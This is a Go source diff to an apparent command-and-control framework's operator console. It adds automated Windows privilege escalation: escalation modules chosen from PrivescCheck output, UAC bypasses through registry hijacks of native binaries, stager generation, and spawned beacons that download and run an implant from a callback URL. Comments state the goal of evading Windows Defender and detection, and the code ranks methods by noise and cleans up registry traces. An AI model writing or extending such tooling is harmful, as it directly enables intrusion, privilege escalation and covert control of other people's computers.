@@ -25,6 +25,7 @@ import (
 	"github.com/ditto/ditto/payload"
 	"github.com/ditto/ditto/persistence"
 	"github.com/ditto/ditto/pivoting"
+	"github.com/ditto/ditto/privesc"
 	"github.com/ditto/ditto/reactions"
 	"github.com/ditto/ditto/tasks"
 	"github.com/ditto/ditto/transport"
@@ -33,26 +34,27 @@ import (
 
 // InteractiveServer manages the interactive server CLI
 type InteractiveServer struct {
-	logger           *core.Logger
-	config           *core.Config
-	server           *transport.Server
-	serverRunning    bool
-	serverMu         sync.RWMutex
-	jobManager       *jobs.JobManager
-	sessionMgr       *core.SessionManager
-	moduleRegistry   *modules.ModuleRegistry
-	currentSession   string
-	lootManager      *loot.LootManager
-	pivotManager     *pivoting.PortForwardManager
-	socksManager     *pivoting.SOCKS5Manager
-	persistManager   *persistence.Installer
-	reactionMgr      *reactions.ReactionManager
-	taskQueue        *tasks.Queue // Shared task queue for all components
-	completer        *interactive.Completer
-	input            interactive.InputReader
-	syncCancel       context.CancelFunc                  // Context cancel function for syncSessions goroutine
-	httpTransports   map[string]*transport.HTTPTransport // Map of addr -> HTTPTransport for session syncing
-	httpTransportsMu sync.RWMutex                        // Mutex for httpTransports map
+	logger              *core.Logger
+	config              *core.Config
+	server              *transport.Server
+	serverRunning       bool
+	serverMu            sync.RWMutex
+	jobManager          *jobs.JobManager
+	sessionMgr          *core.SessionManager
+	moduleRegistry      *modules.ModuleRegistry
+	privescIntelligence *privesc.PrivescIntelligence
+	currentSession      string
+	lootManager         *loot.LootManager
+	pivotManager        *pivoting.PortForwardManager
+	socksManager        *pivoting.SOCKS5Manager
+	persistManager      *persistence.Installer
+	reactionMgr         *reactions.ReactionManager
+	taskQueue           *tasks.Queue // Shared task queue for all components
+	completer           *interactive.Completer
+	input               interactive.InputReader
+	syncCancel          context.CancelFunc                  // Context cancel function for syncSessions goroutine
+	httpTransports      map[string]*transport.HTTPTransport // Map of addr -> HTTPTransport for session syncing
+	httpTransportsMu    sync.RWMutex                        // Mutex for httpTransports map
 }
 
 // NewInteractiveServer creates a new interactive server
@@ -69,19 +71,20 @@ func NewInteractiveServer(logger *core.Logger, cfg *core.Config) *InteractiveSer
 	completer.SetModuleRegistry(moduleCompleterAdapter)
 
 	is := &InteractiveServer{
-		logger:         logger,
-		config:         cfg,
-		jobManager:     jobs.NewJobManager(),
-		sessionMgr:     core.NewSessionManager(),
-		moduleRegistry: moduleRegistry,
-		lootManager:    loot.NewLootManager(logger),
-		pivotManager:   pivoting.NewPortForwardManager(),
-		socksManager:   pivoting.NewSOCKS5Manager(),
-		persistManager: nil, // Created per-installation
-		reactionMgr:    reactions.NewReactionManager(logger),
-		taskQueue:      sharedTaskQueue,
-		completer:      completer,
-		httpTransports: make(map[string]*transport.HTTPTransport),
+		logger:              logger,
+		config:              cfg,
+		jobManager:          jobs.NewJobManager(),
+		sessionMgr:          core.NewSessionManager(),
+		moduleRegistry:      moduleRegistry,
+		privescIntelligence: privesc.NewPrivescIntelligence(moduleRegistry),
+		lootManager:         loot.NewLootManager(logger),
+		pivotManager:        pivoting.NewPortForwardManager(),
+		socksManager:        pivoting.NewSOCKS5Manager(),
+		persistManager:      nil, // Created per-installation
+		reactionMgr:         reactions.NewReactionManager(logger),
+		taskQueue:           sharedTaskQueue,
+		completer:           completer,
+		httpTransports:      make(map[string]*transport.HTTPTransport),
 	}
 
 	// Initialize readline input (fallback to simple input if readline fails)
@@ -460,6 +463,22 @@ func (is *InteractiveServer) startServer(listenAddr string) error {
 	fmt.Printf("[*] Starting C2 server on %s...\n", listenAddr)
 
 	is.server = transport.NewServerWithTaskQueue(is.config, is.logger, is.taskQueue)
+	
+	// Set up stager getter for getsystemsafe
+	is.server.SetStagerGetter(func(callbackURL string) ([]byte, error) {
+		gen := payload.NewGenerator(is.logger, is.moduleRegistry)
+		opts := payload.Options{
+			Type:        "full",
+			OS:          "windows",
+			Arch:        "amd64",
+			CallbackURL: callbackURL,
+			Delay:       5,
+			Jitter:      0.3,
+			Config:      is.config,
+			Debug:       false,
+		}
+		return gen.Generate(opts)
+	})
 
 	// Channel to track server startup errors
 	startupErr := make(chan error, 1)
@@ -1496,6 +1515,8 @@ func (is *InteractiveServer) printSessions() {
 	headerRow := table.Row{
 		"\033[95mID\033[0m",
 		"\033[95mType\033[0m",
+		"\033[95mUser\033[0m",
+		"\033[95mPrivilege\033[0m",
 		"\033[95mTransport\033[0m",
 		"\033[95mRemote Addr\033[0m",
 		"\033[95mConnected\033[0m",
@@ -1518,6 +1539,29 @@ func (is *InteractiveServer) printSessions() {
 		state := session.GetState()
 		stateStr := string(state)
 
+		// Get username and privilege level
+		username := session.GetUsername()
+		if username == "" {
+			if userMeta, ok := session.GetMetadata("username"); ok {
+				if userStr, ok := userMeta.(string); ok {
+					username = userStr
+				}
+			}
+			if username == "" {
+				username = "N/A"
+			}
+		}
+
+		privLevel := session.GetPrivilegeLevel()
+		if privLevel == core.PrivilegeUnknown {
+			// Try to determine from metadata
+			if privMeta, ok := session.GetMetadata("privilege_level"); ok {
+				if privStr, ok := privMeta.(string); ok {
+					privLevel = core.PrivilegeLevel(privStr)
+				}
+			}
+		}
+
 		// Color code rows: green for active, red for dead
 		var colorCode string
 		if state == core.SessionStateDead {
@@ -1527,9 +1571,29 @@ func (is *InteractiveServer) printSessions() {
 		}
 		resetCode := "\033[0m"
 
+		// Color code privilege level
+		var privColor string
+		var privDisplay string
+		switch privLevel {
+		case core.PrivilegeSystem:
+			privColor = "\033[95m" // Magenta/Purple for SYSTEM
+			privDisplay = "SYSTEM"
+		case core.PrivilegeAdmin:
+			privColor = "\033[93m" // Yellow for Admin
+			privDisplay = "Admin"
+		case core.PrivilegeUser:
+			privColor = "\033[96m" // Cyan for User
+			privDisplay = "User"
+		default:
+			privColor = "\033[90m" // Gray for Unknown
+			privDisplay = "Unknown"
+		}
+
 		row := table.Row{
 			colorCode + shortID(session.ID) + resetCode,
 			colorCode + string(session.Type) + resetCode,
+			colorCode + username + resetCode,
+			privColor + privDisplay + resetCode,
 			colorCode + session.Transport + resetCode,
 			colorCode + remoteAddr + resetCode,
 			colorCode + session.ConnectedAt.Format("15:04:05") + resetCode,
@@ -1979,6 +2043,20 @@ func (is *InteractiveServer) sessionShell(sessionID string) error {
 			})
 
 			fmt.Printf("[*] Tasks for session %s (%d total):\n\n", shortID(sessionID), len(sessionTasks))
+
+			// Check for unsupported module types
+			hasUnsupported := false
+			for _, task := range sessionTasks {
+				if task.Type == "module" && strings.Contains(task.Command, "csharp/") {
+					hasUnsupported = true
+					break
+				}
+			}
+			if hasUnsupported {
+				fmt.Println("[!] Note: C# modules are not yet supported by Go implants")
+				fmt.Println("    They will fail with 'Module not available' error\n")
+			}
+
 			for i, task := range sessionTasks {
 				statusColor := ""
 				resetColor := "\033[0m"
@@ -1996,6 +2074,8 @@ func (is *InteractiveServer) sessionShell(sessionID string) error {
 				fmt.Printf("     Command: %s\n", task.Command)
 				fmt.Printf("     Status: %s%s%s\n", statusColor, task.Status, resetColor)
 				fmt.Printf("     Created: %s\n", task.CreatedAt.Format("2006-01-02 15:04:05"))
+
+				// Show result preview for completed tasks
 				if task.Status == "completed" && task.Result != nil {
 					if resultMap, ok := task.Result.(map[string]interface{}); ok {
 						if resultValue, ok := resultMap["result"].(string); ok {
@@ -2005,33 +2085,92 @@ func (is *InteractiveServer) sessionShell(sessionID string) error {
 								resultPreview = resultPreview[:100] + "..."
 							}
 							fmt.Printf("     Result: %s\n", resultPreview)
+
+							// Show recommendation count for privesccheck
+							if task.Type == "module" && strings.Contains(task.Command, "privesccheck") {
+								if _, hasRecs := resultMap["recommendations"]; hasRecs {
+									fmt.Printf("     [*] Actionable recommendations available\n")
+								}
+							}
+
+							fmt.Printf("     Use 'task %s' to see full output\n", task.ID)
 						}
 					}
+				} else if task.Status == "in_progress" {
+					// Check if task has been in progress for a while (might be stuck)
+					elapsed := time.Since(task.CreatedAt)
+					if elapsed > 30*time.Second {
+						fmt.Printf("     [!] Task has been running for %v - may be stuck or failed\n", elapsed.Round(time.Second))
+					}
+					fmt.Printf("     Use 'task %s' to check for results\n", task.ID)
+				} else if task.Status == "pending" {
+					fmt.Printf("     Use 'task %s' to check status\n", task.ID)
 				}
 				fmt.Println()
+			}
+
+			if len(sessionTasks) > 0 {
+				fmt.Println("[*] Tip: Use 'task <number>' or 'task <task_id>' to view full results")
+				fmt.Println("    Example: 'task 1' or 'task task-1761879567706376329'")
 			}
 		case "task":
 			if len(args) < 1 {
 				fmt.Println("[!] Error: Task ID is required")
-				fmt.Println("    Usage: task <task_id>")
+				fmt.Println("    Usage: task <task_id> or task <number>")
 				fmt.Println("    Example: task task-1761878796775293449")
-				fmt.Println("    Use 'tasks' to list all tasks")
-				continue
-			}
-			taskID := args[0]
-			task := is.taskQueue.Get(taskID)
-			if task == nil {
-				fmt.Printf("[!] Task not found: %s\n", taskID)
+				fmt.Println("    Example: task 1 (to view first task from 'tasks' list)")
 				fmt.Println("    Use 'tasks' to list all tasks")
 				continue
 			}
 
-			// Check if task belongs to current session
-			if task.Parameters != nil {
-				if taskSessionID, ok := task.Parameters["session_id"].(string); ok {
-					if taskSessionID != sessionID {
-						fmt.Printf("[!] Task %s belongs to a different session\n", taskID)
-						continue
+			// Get all tasks for this session first
+			allTasks := is.taskQueue.GetAll()
+			sessionTasks := make([]*tasks.Task, 0)
+			for _, task := range allTasks {
+				if task.Parameters != nil {
+					if taskSessionID, ok := task.Parameters["session_id"].(string); ok {
+						if taskSessionID == sessionID {
+							sessionTasks = append(sessionTasks, task)
+						}
+					}
+				}
+			}
+
+			// Sort by creation time (newest first) to match 'tasks' command order
+			sort.Slice(sessionTasks, func(i, j int) bool {
+				return sessionTasks[i].CreatedAt.After(sessionTasks[j].CreatedAt)
+			})
+
+			var task *tasks.Task
+			taskID := args[0]
+
+			// Check if it's a numeric ID (1-based index like modules)
+			if numID, err := strconv.Atoi(taskID); err == nil {
+				if numID > 0 && numID <= len(sessionTasks) {
+					task = sessionTasks[numID-1] // Convert to 0-based index
+					taskID = task.ID             // Update taskID to actual ID for consistency
+				} else {
+					fmt.Printf("[!] Invalid task number: %d (must be between 1 and %d)\n", numID, len(sessionTasks))
+					fmt.Println("    Use 'tasks' to list all tasks")
+					continue
+				}
+			} else {
+				// Try to find by task ID
+				task = is.taskQueue.Get(taskID)
+				if task == nil {
+					fmt.Printf("[!] Task not found: %s\n", taskID)
+					fmt.Println("    Use 'tasks' to list all tasks")
+					fmt.Println("    Note: Tasks are removed 5 minutes after completion")
+					continue
+				}
+
+				// Check if task belongs to current session
+				if task.Parameters != nil {
+					if taskSessionID, ok := task.Parameters["session_id"].(string); ok {
+						if taskSessionID != sessionID {
+							fmt.Printf("[!] Task %s belongs to a different session\n", taskID)
+							continue
+						}
 					}
 				}
 			}
@@ -2048,13 +2187,46 @@ func (is *InteractiveServer) sessionShell(sessionID string) error {
 					if resultValue, ok := resultMap["result"].(string); ok {
 						fmt.Printf("\n[*] Result:\n")
 						fmt.Println(resultValue)
+
+						// Post-process privesccheck results to add actionable recommendations
+						if task.Type == "module" && strings.Contains(task.Command, "privesccheck") {
+							is.enhancePrivescCheckResults(resultValue, taskID)
+						}
 					}
 				}
 			} else if task.Status == "pending" || task.Status == "in_progress" {
-				fmt.Printf("\n[*] Task is still %s. Results will appear here when completed.\n", task.Status)
+				elapsed := time.Since(task.CreatedAt)
+				fmt.Printf("\n[*] Task is still %s (running for %v)\n", task.Status, elapsed.Round(time.Second))
+				fmt.Println("    Results will appear here when completed.")
+
+				// Warn about unsupported module types
+				if task.Type == "module" && strings.Contains(task.Command, "csharp/") {
+					fmt.Println("\n[!] Warning: C# modules are not supported by Go implants")
+					fmt.Println("    This task will fail. Only PowerShell and Python modules are supported.")
+				}
+
+				// Check if task might be stuck
+				if task.Status == "in_progress" && elapsed > 60*time.Second {
+					fmt.Println("\n[!] This task has been running for over 60 seconds and may be stuck.")
+					fmt.Println("    Check server logs or try executing a simple command to verify the session is responsive.")
+				}
+			} else if task.Status == "failed" || task.Status == "error" {
+				fmt.Println("\n[!] Task failed or encountered an error.")
+				if task.Result != nil {
+					if resultMap, ok := task.Result.(map[string]interface{}); ok {
+						if resultValue, ok := resultMap["result"].(string); ok {
+							fmt.Println("\n[*] Error details:")
+							fmt.Println(resultValue)
+						}
+					}
+				}
 			}
 		case "getsystem":
 			if err := is.executeGetSystem(sessionID); err != nil {
+				fmt.Printf("[!] Error: %v\n", err)
+			}
+		case "getsystemsafe":
+			if err := is.executeGetSystemSafe(sessionID); err != nil {
 				fmt.Printf("[!] Error: %v\n", err)
 			}
 		case "kill", "k":
@@ -2273,6 +2445,42 @@ func (is *InteractiveServer) executeModule(sessionID, moduleID string, args []st
 	return taskID, nil
 }
 
+// enhancePrivescCheckResults analyzes PrivescCheck output and adds actionable recommendations
+func (is *InteractiveServer) enhancePrivescCheckResults(output string, taskID string) {
+	if is.privescIntelligence == nil {
+		return
+	}
+
+	// Determine if current user is admin from the output
+	isAdmin := is.privescIntelligence.DetermineUserLevel(output)
+
+	// Analyze the output and get recommendations
+	recommendations, err := is.privescIntelligence.AnalyzePrivescCheckOutput(output, isAdmin)
+	if err != nil {
+		is.logger.Debug("Failed to analyze PrivescCheck output: %v", err)
+		return
+	}
+
+	if len(recommendations) > 0 {
+		// Format and display recommendations
+		formatted := is.privescIntelligence.FormatRecommendations(recommendations)
+		fmt.Println(formatted)
+
+		// Also update the task result to include recommendations
+		if task := is.taskQueue.Get(taskID); task != nil && task.Result != nil {
+			if resultMap, ok := task.Result.(map[string]interface{}); ok {
+				// Add recommendations to the result
+				if resultValue, ok := resultMap["result"].(string); ok {
+					enhancedResult := resultValue + "\n" + formatted
+					resultMap["result"] = enhancedResult
+					resultMap["recommendations"] = recommendations
+					is.taskQueue.SetResult(taskID, resultMap)
+				}
+			}
+		}
+	}
+}
+
 func (is *InteractiveServer) executeGetSystem(sessionID string) error {
 	if is.server == nil {
 		return fmt.Errorf("server not initialized\n" +
@@ -2299,43 +2507,668 @@ func (is *InteractiveServer) executeGetSystem(sessionID string) error {
 		}
 	}
 
-	// Use Empire's Get-System module
-	moduleID := "powershell/privesc/getsystem"
-	_, ok = is.moduleRegistry.GetModuleByPath(moduleID)
-	if !ok {
-		// Fallback to direct ID lookup
-		_, ok = is.moduleRegistry.GetModule(moduleID)
-		if !ok {
-			return fmt.Errorf("getsystem module not found: %s\n"+
-				"  Ensure modules are loaded from modules/empire directory\n"+
-				"  Use 'modules' command to list available modules", moduleID)
+	fmt.Printf("[*] Starting automated privilege escalation chain...\n")
+	fmt.Printf("[*] Step 1: Detecting current privilege level...\n")
+
+	// Step 1: Detect current privilege level
+	currentPriv, username, err := is.detectPrivilegeLevel(sessionID)
+	if err != nil {
+		return fmt.Errorf("failed to detect privilege level: %v", err)
+	}
+
+	// Update session with detected info
+	if username != "" {
+		session.SetUsername(username)
+		session.SetPrivilegeLevel(currentPriv)
+		session.SetMetadata("username", username)
+		session.SetMetadata("privilege_level", string(currentPriv))
+	}
+
+	fmt.Printf("[+] Current user: %s (Privilege: %s)\n", username, currentPriv)
+
+	// Step 2: If user, try to escalate to admin first
+	if currentPriv == core.PrivilegeUser {
+		fmt.Printf("[*] Step 2: Current user -> Admin escalation needed\n")
+		fmt.Printf("[*] Running PrivescCheck to identify exploitable vulnerabilities...\n")
+
+		// Run PrivescCheck
+		privescCheckTaskID, err := is.executeModule(sessionID, "powershell/privesc/privesccheck", []string{})
+		if err != nil {
+			return fmt.Errorf("failed to run PrivescCheck: %v", err)
+		}
+
+		// Wait for PrivescCheck to complete
+		fmt.Printf("[*] Waiting for PrivescCheck to complete (task: %s)...\n", privescCheckTaskID)
+		is.pollTaskResultWithTimeout(sessionID, privescCheckTaskID, 120*time.Second)
+
+		// Get PrivescCheck results
+		privescCheckTask := is.taskQueue.Get(privescCheckTaskID)
+		if privescCheckTask == nil || privescCheckTask.Status != "completed" {
+			return fmt.Errorf("PrivescCheck failed or timed out")
+		}
+
+		var privescCheckOutput string
+		if privescCheckTask.Result != nil {
+			if resultMap, ok := privescCheckTask.Result.(map[string]interface{}); ok {
+				if resultValue, ok := resultMap["result"].(string); ok {
+					privescCheckOutput = resultValue
+				}
+			}
+		}
+
+		if privescCheckOutput == "" {
+			return fmt.Errorf("PrivescCheck returned no output")
+		}
+
+		// Analyze results and get recommendations
+		isAdmin := is.privescIntelligence.DetermineUserLevel(privescCheckOutput)
+		recommendations, err := is.privescIntelligence.AnalyzePrivescCheckOutput(privescCheckOutput, isAdmin)
+		if err != nil {
+			return fmt.Errorf("failed to analyze PrivescCheck output: %v", err)
+		}
+
+		// Find User->Admin modules to try
+		userToAdminModules := make([]privesc.ModuleMatch, 0)
+		for _, rec := range recommendations {
+			for _, match := range rec.AvailableModules {
+				if match.EscalationType == "User->Admin" {
+					userToAdminModules = append(userToAdminModules, match)
+				}
+			}
+		}
+
+		if len(userToAdminModules) == 0 {
+			return fmt.Errorf("no User->Admin escalation opportunities found by PrivescCheck")
+		}
+
+		// Try modules in order of confidence (High -> Medium -> Low)
+		sort.Slice(userToAdminModules, func(i, j int) bool {
+			confMap := map[string]int{"High": 3, "Medium": 2, "Low": 1}
+			return confMap[userToAdminModules[i].Confidence] > confMap[userToAdminModules[j].Confidence]
+		})
+
+		fmt.Printf("[*] Found %d User->Admin escalation opportunities\n", len(userToAdminModules))
+		fmt.Printf("[*] Attempting escalation modules in order of confidence...\n")
+
+		escalatedToAdmin := false
+		for i, match := range userToAdminModules {
+			fmt.Printf("[*] Trying module %d/%d: %s (%s confidence)\n", i+1, len(userToAdminModules), match.ModuleID, match.Confidence)
+			fmt.Printf("    Reason: %s\n", match.Reason)
+
+			// Execute the module
+			moduleTaskID, err := is.executeModule(sessionID, match.ModuleID, []string{})
+			if err != nil {
+				fmt.Printf("[!] Failed to queue module %s: %v\n", match.ModuleID, err)
+				continue
+			}
+
+			// Wait for completion (60 seconds for UAC bypass modules)
+			is.pollTaskResultWithTimeout(sessionID, moduleTaskID, 60*time.Second)
+
+			// Check if escalation succeeded by detecting new privilege level
+			time.Sleep(2 * time.Second) // Give session time to update
+			newPriv, _, err := is.detectPrivilegeLevel(sessionID)
+			if err == nil && newPriv == core.PrivilegeAdmin {
+				fmt.Printf("[+] Successfully escalated to Admin using %s!\n", match.ModuleID)
+				session.SetPrivilegeLevel(core.PrivilegeAdmin)
+				session.SetMetadata("privilege_level", "admin")
+				escalatedToAdmin = true
+				currentPriv = core.PrivilegeAdmin
+				break
+			}
+		}
+
+		if !escalatedToAdmin {
+			return fmt.Errorf("failed to escalate from User to Admin. All %d attempts failed.", len(userToAdminModules))
 		}
 	}
 
-	// Execute with NamedPipe technique (most reliable)
+	// Step 3: If admin, escalate to SYSTEM
+	if currentPriv == core.PrivilegeAdmin {
+		fmt.Printf("[*] Step 3: Admin -> SYSTEM escalation\n")
+		fmt.Printf("[*] Executing Get-System module...\n")
+
+		// Try NamedPipe first, then Token
+		techniques := []string{"NamedPipe", "Token"}
+		escalatedToSystem := false
+
+		for _, technique := range techniques {
+			fmt.Printf("[*] Trying Get-System with %s technique...\n", technique)
+
+			params := map[string]interface{}{
+				"session_id":  sessionID,
+				"Technique":   technique,
+				"ServiceName": "",
+				"PipeName":    "",
+			}
+
+			taskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
+			task := &tasks.Task{
+				ID:         taskID,
+				Type:       "module",
+				Command:    "powershell/privesc/getsystem",
+				Parameters: params,
+			}
+			is.server.EnqueueTask(task)
+
+			// Wait for completion
+			is.pollTaskResultWithTimeout(sessionID, taskID, 30*time.Second)
+
+			// Check result
+			getSystemTask := is.taskQueue.Get(taskID)
+			if getSystemTask != nil && getSystemTask.Status == "completed" {
+				if resultMap, ok := getSystemTask.Result.(map[string]interface{}); ok {
+					if resultValue, ok := resultMap["result"].(string); ok {
+						// Check if we got SYSTEM
+						if strings.Contains(strings.ToLower(resultValue), "system") ||
+							strings.Contains(strings.ToLower(resultValue), "nt authority") {
+							fmt.Printf("[+] Successfully escalated to SYSTEM using %s technique!\n", technique)
+							escalatedToSystem = true
+							break
+						}
+					}
+				}
+			}
+		}
+
+		if !escalatedToSystem {
+			return fmt.Errorf("failed to escalate from Admin to SYSTEM. Both techniques failed.")
+		}
+	}
+
+	// Step 4: Spawn new beacon as SYSTEM
+	fmt.Printf("[*] Step 4: Spawning new beacon as SYSTEM...\n")
+	err = is.spawnElevatedBeacon(sessionID, core.PrivilegeSystem)
+	if err != nil {
+		return fmt.Errorf("failed to spawn SYSTEM beacon: %v", err)
+	}
+
+	fmt.Printf("[+] Automated privilege escalation complete!\n")
+	fmt.Printf("[+] A new SYSTEM session should appear shortly. Check 'sessions' command.\n")
+	return nil
+}
+
+// executeGetSystemSafe performs stealthy privilege escalation using only LOLBins and native Windows tools
+// This avoids PowerShell modules and suspicious behavior patterns to evade Windows Defender
+func (is *InteractiveServer) executeGetSystemSafe(sessionID string) error {
+	if is.server == nil {
+		return fmt.Errorf("server not initialized\n" +
+			"  Ensure the C2 server is running with 'server start'")
+	}
+
+	// Validate session exists
+	session, ok := is.sessionMgr.GetSession(sessionID)
+	if !ok {
+		return fmt.Errorf("session not found: %s\n"+
+			"  Session may have disconnected. Use 'sessions' to list active sessions", shortID(sessionID))
+	}
+
+	// Check if Windows session
+	transportType := session.Transport
+	if transportType != "http" && transportType != "https" {
+		if osInfo, ok := session.GetMetadata("os"); ok {
+			if osStr, ok := osInfo.(string); ok {
+				if !strings.Contains(strings.ToLower(osStr), "windows") {
+					return fmt.Errorf("getsystemsafe is only supported on Windows")
+				}
+			}
+		}
+	}
+
+	fmt.Printf("[*] Starting stealthy privilege escalation (LOLBin-only)...\n")
+	fmt.Printf("[*] Using native Windows tools only - no PowerShell modules\n")
+
+	lolbinEsc := &privesc.LOLBinEscalation{}
+
+	// Step 1: Detect privilege level using native commands
+	fmt.Printf("[*] Step 1: Detecting privilege level (using native 'whoami' command)...\n")
+	currentPriv, username, err := is.detectPrivilegeLevelLOLBin(sessionID)
+	if err != nil {
+		return fmt.Errorf("failed to detect privilege level: %v", err)
+	}
+
+	// Update session with detected info
+	if username != "" {
+		session.SetUsername(username)
+		session.SetPrivilegeLevel(currentPriv)
+		session.SetMetadata("username", username)
+		session.SetMetadata("privilege_level", string(currentPriv))
+	}
+
+	fmt.Printf("[+] Current user: %s (Privilege: %s)\n", username, currentPriv)
+
+	// Step 2: If user, escalate to admin using LOLBins
+	if currentPriv == core.PrivilegeUser {
+		fmt.Printf("[*] Step 2: User -> Admin escalation (using LOLBins)...\n")
+		fmt.Printf("[*] Trying stealthy UAC bypass methods in order of stealth...\n")
+
+		methods := lolbinEsc.GetUserToAdminMethods()
+		// Sort by noise level (Low first)
+		sort.Slice(methods, func(i, j int) bool {
+			noiseMap := map[string]int{"Low": 1, "Medium": 2, "High": 3}
+			return noiseMap[methods[i].NoiseLevel] < noiseMap[methods[j].NoiseLevel]
+		})
+
+		escalatedToAdmin := false
+		for i, method := range methods {
+			fmt.Printf("[*] Trying method %d/%d: %s (Noise: %s)\n", i+1, len(methods), method.Name, method.NoiseLevel)
+
+			// Get callback URL for spawn command
+			callbackURL := is.getCallbackURL(session)
+			if callbackURL == "" {
+				return fmt.Errorf("could not determine callback URL")
+			}
+
+			// Generate spawn command using LOLBins
+			spawnCmd := lolbinEsc.GenerateSpawnCommand(callbackURL, "admin")
+			
+			// Execute method commands
+			for _, cmdTemplate := range method.Commands {
+				cmd := fmt.Sprintf(cmdTemplate, spawnCmd)
+				taskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
+				task := &tasks.Task{
+					ID:         taskID,
+					Type:       "shell",
+					Command:    cmd,
+					Parameters: map[string]interface{}{"session_id": sessionID},
+				}
+				is.server.EnqueueTask(task)
+				
+				// Wait briefly for command execution
+				time.Sleep(1 * time.Second)
+			}
+
+			// Wait for escalation to take effect
+			// Registry hijack methods spawn NEW elevated processes (eventvwr.exe, fodhelper.exe, etc.)
+			// These processes will execute our spawn command, which downloads and runs a new beacon
+			// We need to wait for the new beacon to connect, then check if it's admin
+			fmt.Printf("[*] Waiting for elevated process to spawn new beacon...\n")
+			time.Sleep(8 * time.Second)
+
+			// Check if a new Admin session appeared (the spawned process should connect as admin)
+			allSessions := is.sessionMgr.ListSessions()
+			foundAdminSession := false
+			for _, sess := range allSessions {
+				if sess.GetPrivilegeLevel() == core.PrivilegeAdmin && sess.ID != sessionID {
+					fmt.Printf("[+] New Admin session detected: %s (from %s method)\n", shortID(sess.ID), method.Name)
+					// Update original session privilege level for tracking
+					session.SetPrivilegeLevel(core.PrivilegeAdmin)
+					session.SetMetadata("privilege_level", "admin")
+					escalatedToAdmin = true
+					currentPriv = core.PrivilegeAdmin
+					foundAdminSession = true
+					break
+				}
+			}
+			
+			// Also check if current session got elevated (some methods might elevate in-place)
+			if !foundAdminSession {
+				newPriv, _, err := is.detectPrivilegeLevelLOLBin(sessionID)
+				if err == nil && newPriv == core.PrivilegeAdmin {
+					fmt.Printf("[+] Successfully escalated current session to Admin using %s!\n", method.Name)
+					session.SetPrivilegeLevel(core.PrivilegeAdmin)
+					session.SetMetadata("privilege_level", "admin")
+					escalatedToAdmin = true
+					currentPriv = core.PrivilegeAdmin
+					foundAdminSession = true
+				}
+			}
+			
+			if foundAdminSession {
+				// Cleanup registry keys (non-blocking, errors are OK)
+				fmt.Printf("[*] Cleaning up registry modifications...\n")
+				for _, cleanupCmd := range lolbinEsc.CleanupRegistryKeys() {
+					cleanupTaskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
+					cleanupTask := &tasks.Task{
+						ID:         cleanupTaskID,
+						Type:       "shell",
+						Command:    cleanupCmd,
+						Parameters: map[string]interface{}{"session_id": sessionID},
+					}
+					is.server.EnqueueTask(cleanupTask)
+					// Don't wait for cleanup - it's best-effort
+				}
+				break
+			} else {
+				// Method failed - try next one
+				fmt.Printf("[!] Method %s did not result in Admin privileges, trying next...\n", method.Name)
+				// Cleanup registry modifications from failed attempt
+				for _, cleanupCmd := range lolbinEsc.CleanupRegistryKeys() {
+					cleanupTaskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
+					cleanupTask := &tasks.Task{
+						ID:         cleanupTaskID,
+						Type:       "shell",
+						Command:    cleanupCmd,
+						Parameters: map[string]interface{}{"session_id": sessionID},
+					}
+					is.server.EnqueueTask(cleanupTask)
+				}
+				time.Sleep(2 * time.Second) // Brief pause between attempts
+			}
+		}
+
+		if !escalatedToAdmin {
+			return fmt.Errorf("failed to escalate from User to Admin using LOLBins: all %d methods failed", len(methods))
+		}
+	}
+
+	// Step 3: If admin, escalate to SYSTEM using LOLBins
+	if currentPriv == core.PrivilegeAdmin {
+		fmt.Printf("[*] Step 3: Admin -> SYSTEM escalation (using LOLBins)...\n")
+
+		methods := lolbinEsc.GetAdminToSystemMethods()
+		// Sort by noise level (Low first)
+		sort.Slice(methods, func(i, j int) bool {
+			noiseMap := map[string]int{"Low": 1, "Medium": 2, "High": 3}
+			return noiseMap[methods[i].NoiseLevel] < noiseMap[methods[j].NoiseLevel]
+		})
+
+		escalatedToSystem := false
+		for i, method := range methods {
+			fmt.Printf("[*] Trying method %d/%d: %s (Noise: %s)\n", i+1, len(methods), method.Name, method.NoiseLevel)
+
+			// Get callback URL for spawn command
+			callbackURL := is.getCallbackURL(session)
+			if callbackURL == "" {
+				return fmt.Errorf("could not determine callback URL")
+			}
+
+			// Generate spawn command using LOLBins
+			spawnCmd := lolbinEsc.GenerateSpawnCommand(callbackURL, "system")
+
+			// Execute method commands with proper timing
+			for _, cmdTemplate := range method.Commands {
+				cmd := fmt.Sprintf(cmdTemplate, spawnCmd)
+				taskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
+				task := &tasks.Task{
+					ID:         taskID,
+					Type:       "shell",
+					Command:    cmd,
+					Parameters: map[string]interface{}{"session_id": sessionID},
+				}
+				is.server.EnqueueTask(task)
+				
+				// Handle different command types
+				if strings.Contains(cmd, "schtasks") {
+					// Scheduled task commands - wait for completion
+					is.pollTaskResultWithTimeout(sessionID, taskID, 10*time.Second)
+				} else if strings.Contains(cmd, "sc ") {
+					// Service commands - wait for service operations
+					is.pollTaskResultWithTimeout(sessionID, taskID, 10*time.Second)
+				} else if strings.Contains(cmd, "wmic") {
+					// WMI commands - can be slow
+					is.pollTaskResultWithTimeout(sessionID, taskID, 15*time.Second)
+				} else if strings.Contains(cmd, "timeout") {
+					// Timeout commands
+					is.pollTaskResultWithTimeout(sessionID, taskID, 10*time.Second)
+				} else {
+					// Regular commands
+					is.pollTaskResultWithTimeout(sessionID, taskID, 10*time.Second)
+				}
+			}
+
+			// Wait for new SYSTEM session to connect (spawned process needs time to beacon)
+			fmt.Printf("[*] Waiting for new SYSTEM session to connect...\n")
+			time.Sleep(10 * time.Second)
+			
+			// Check if a new SYSTEM session appeared
+			allSessions := is.sessionMgr.ListSessions()
+			for _, sess := range allSessions {
+				if sess.GetPrivilegeLevel() == core.PrivilegeSystem {
+					fmt.Printf("[+] New SYSTEM session detected: %s\n", shortID(sess.ID))
+					escalatedToSystem = true
+					break
+				}
+			}
+			
+			if escalatedToSystem {
+				break
+			} else {
+				fmt.Printf("[!] Method %s did not produce SYSTEM session, trying next...\n", method.Name)
+				time.Sleep(2 * time.Second)
+			}
+		}
+
+		if !escalatedToSystem {
+			return fmt.Errorf("failed to escalate from Admin to SYSTEM using LOLBins")
+		}
+	}
+
+	fmt.Printf("[+] Stealthy privilege escalation complete!\n")
+	fmt.Printf("[+] A new elevated session should appear shortly. Check 'sessions' command.\n")
+	fmt.Printf("[*] Note: This method uses only native Windows tools (LOLBins) to avoid detection\n")
+	return nil
+}
+
